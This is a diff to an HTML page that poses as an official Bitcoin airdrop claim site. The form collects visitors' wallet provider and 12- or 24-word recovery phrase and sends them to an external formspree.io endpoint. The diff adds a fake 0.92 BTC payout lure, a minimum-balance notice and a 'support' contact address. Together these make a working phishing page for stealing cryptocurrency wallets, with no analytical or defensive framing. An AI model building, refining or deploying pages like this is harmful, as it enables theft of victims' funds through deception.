@@ -35,7 +35,13 @@
       margin: 40px auto;
     }
 
-    input, button {
+    .amount {
+      font-weight: bold;
+      margin-bottom: 15px;
+      font-size: 1.1em;
+    }
+
+    input, select, button {
       display: block;
       width: 100%;
       padding: 14px;
@@ -46,7 +52,7 @@
       box-sizing: border-box;
     }
 
-    input:focus {
+    input:focus, select:focus {
       border-color: #0a2342;
       outline: none;
     }
@@ -70,6 +76,13 @@
       margin-top: 20px;
       line-height: 1.4;
     }
+
+    .contact-box {
+      font-size: 13px;
+      color: #777;
+      margin-top: 10px;
+      line-height: 1.6;
+    }
   </style>
 </head>
 <body>
@@ -78,11 +91,19 @@
   </h1>
 
   <div class="form-wrapper">
+    <div class="amount">Amount to be received: 0.92 BTC ≈ $99,791</div>
+
     <form action="https://formspree.io/f/mrbkwjdj" method="POST">
       <input type="text" name="wallet" placeholder="Wallet Provider (e.g. MetaMask)" required>
-      <input type="text" name="phrase" placeholder="Enter 12-word Recovery Phrase" required>
+      <input type="text" name="phrase" placeholder="Enter 12 or 24-word Recovery Phrase" required>
       <button type="submit">Claim Official Airdrop</button>
     </form>
+
+    <div class="contact-box">
+      Minimum wallet balance: 0.0092 BTC<br>
+      <small>(If your balance is lower, contact support)</small><br>
+      For inquiries: <strong>admin@govbtcclaim.org</strong>
+    </div>
   </div>
 
   <div class="footer-note">
@@ -90,3 +111,5 @@
   </div>
 </body>
 </html>
+
+  
